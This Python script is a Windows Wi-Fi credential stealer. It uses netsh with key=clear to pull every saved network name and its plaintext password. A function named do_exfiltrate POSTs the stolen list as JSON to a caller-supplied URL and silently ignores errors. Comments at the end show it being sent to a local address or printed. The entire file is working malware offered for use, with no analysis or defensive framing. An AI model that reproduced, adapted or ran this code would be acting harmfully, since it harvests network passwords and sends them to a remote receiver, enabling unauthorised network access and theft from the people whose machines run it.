import os
import requests
import json
import typing

def find_wifi_credentials() -> typing.List[typing.Dict[str,str]]:
    raw_response: typing.TextIO = os.popen("netsh wlan show profiles | find \"All User Profile\"")
    raw_ssids: typing.Iterable = filter(lambda x:len(x) > 0,map(lambda x:x.split(":")[1].strip() if len(x) > 0 else '',raw_response.read().split("\n")))
    
    ssid_key:typing.List[typing.Dict[str,str]] = []

    for ssid in raw_ssids:
        found_key:str = os.popen(f"netsh wlan show profiles key=clear name=\"{ssid}\" | find \"Key Content\"").read()
        ssid_key.append({"ssid":ssid,"password":found_key.strip().split(":")[1] if found_key != "" else found_key})

    return ssid_key


def do_exfiltrate(url:str,data:typing.List[typing.Dict[str,str]]) -> None:
    try:
        requests.post(url,json=json.dumps(data),timeout=2.50)
    except:
        pass


def main(*,exfiltrate:bool=False,url:str="") -> None:
    stolen_wifi_credentials:typing.List[typing.Dict[str,str]] = find_wifi_credentials()

    if(exfiltrate):
        do_exfiltrate(url,stolen_wifi_credentials)
        return
    print(stolen_wifi_credentials)

#main(exfiltrate=True,url="http://localhost:4000") ---> exilfiltrates the data as json to the given url
#main() --> prints the details in the cmdline